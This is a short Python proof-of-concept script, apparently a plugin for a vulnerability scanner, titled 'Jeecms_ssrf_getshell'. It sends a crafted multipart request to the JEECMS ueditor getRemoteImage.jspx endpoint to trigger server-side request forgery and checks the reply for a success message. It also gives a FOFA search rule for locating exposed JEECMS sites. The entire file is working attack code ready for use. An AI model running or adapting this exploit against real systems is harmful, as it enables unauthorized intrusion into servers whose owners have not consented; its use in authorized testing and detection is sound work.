#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='Jeecms_ssrf_getshell'
AUTHOR="境心"
REMARK='Jeecms ssrf漏洞'
FOFA_RULE='app="JEECMS"'
######################################################

def poc_content():
    content = """-----------------------------245629485030790359921083390342\r\nContent-Disposition: form-data; name="upfile"\r\n\r\nhttp://127.0.0.1:9699/test1.jsp\r\n-----------------------------245629485030790359921083390342--"""
    return content

def poc(targrt):
    result = {}
    url = targrt + "/ueditor/getRemoteImage.jspx"
    content = poc_content()
    headers = {
        "User-Agent":ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept - Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------245629485030790359921083390342",
        "Connection": "close"
    }
    res = requests.post(url, headers=headers, data=content, timeout=5, verify=False,proxies=proxies)
    res = res.text
    if "srcUrl" in res and "远程图片抓取成功" in res:
        result['message'] = res
        result['target_url'] = url
        return result

if __name__ == '__main__':
    # poc调用
    poc("https://127.0.0.1")